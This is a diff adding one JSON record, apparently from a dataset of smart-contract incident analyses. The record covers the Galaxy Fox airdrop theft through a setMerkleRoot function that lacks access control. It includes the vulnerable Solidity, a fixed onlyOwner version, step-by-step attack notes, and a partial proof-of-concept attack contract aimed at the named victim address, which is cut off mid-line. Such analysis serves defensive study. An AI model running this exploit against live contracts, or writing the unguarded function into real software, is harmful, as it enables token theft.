@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-05-XX_GFOX_SetMerkleRootAccessControl",
+ "source_file": "2024/2024-05-XX_GFOX_SetMerkleRootAccessControl.md",
+ "title": "GFOX — Missing Access Control on setMerkleRoot Airdrop Theft Analysis",
+ "date": "2024-05-01",
+ "protocol": "Galaxy Fox",
+ "chain": "Ethereum",
+ "loss_raw": "~330,000 GFOX tokens",
+ "loss_usd": null,
+ "root_cause": "The `setMerkleRoot(bytes32)` function lacked access control, allowing the attacker to set an arbitrary Merkle root and call `claim()` with a valid proof against the manipulated root to drain all airdrop tokens",
+ "attack_tx": null,
+ "vulnerable_contract": "0x47c4b314",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: setMerkleRoot has no access control\ncontract GFOXAirdrop {\n    bytes32 public merkleRoot;\n\n    // No onlyOwner — anyone can change the Merkle root\n    function setMerkleRoot(bytes32 _merkleRoot) external {\n        merkleRoot = _merkleRoot;\n    }\n\n    function claim(address to, uint256 amount, bytes32[] calldata proof) external {\n        // Verification uses the root set by the attacker\n        bytes32 leaf = keccak256(abi.encodePacked(to, amount));\n        require(MerkleProof.verify(proof, merkleRoot, leaf), \"invalid proof\");\n        GFOX.transfer(to, amount);\n    }\n}\n\n//",
+  "// File: GFOX_decompiled.sol\ncontract GFOX {\n    function claim(address p0, uint256 p1, bytes32[] memory p2) external {}  // ❌ Vulnerable"
+ ],
+ "code_after": [
+  "✅ Safe code: only the owner can set the Merkle root\nfunction setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {\n    merkleRoot = _merkleRoot;\n    emit MerkleRootUpdated(_merkleRoot);\n}"
+ ],
+ "steps": [
+  "→ [1] Compute leaf using attacker address and desired amount",
+  "→ [2] Call setMerkleRoot(leaf)",
+  "No access control → merkleRoot = leaf",
+  "→ [3] Call claim(attacker, claimAmount, [])",
+  "→ [4] Drain ~330,000 GFOX airdrop tokens"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Compute leaf using attacker address and desired amount\n  │         └─ leaf = keccak256(abi.encodePacked(attacker, claimAmount))\n  │\n  ├─→ [2] Call setMerkleRoot(leaf)\n  │         └─ No access control → merkleRoot = leaf\n  │         └─ leaf as a single-node Merkle tree equals the root\n  │\n  ├─→ [3] Call claim(attacker, claimAmount, [])\n  │         └─ Empty proof array passes because leaf == merkleRoot\n  │\n  └─→ [4] Drain ~330,000 GFOX airdrop tokens",
+  "interface IVictim {\n    function setMerkleRoot(bytes32 _merkleRoot) external;\n    function claim(address to, uint256 amount, bytes32[] calldata proof) external;\n}\n\ncontract AttackContract {\n    IVictim constant victim = IVictim(0x47c4b3144de2c87a458d510c0c0911d1903d1686);\n    IERC20  constant GFOX   = IERC20(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662);\n\n    function testExploit() external {\n        uint256 claimAmount = GFOX.balanceOf(address(victim));\n\n        // [1] Compute leaf using attacker address + full balance\n        bytes32 leaf = keccak256(abi.encodePacked(address(this), claimAmount));\n\n        // [2] Set computed leaf as Merkle root (no access control)\n        victim.setMerkleRoot(leaf);\n\n        // [3] Execute claim with empty proof (passes because leaf == root)\n        victim"
+ ]
+}
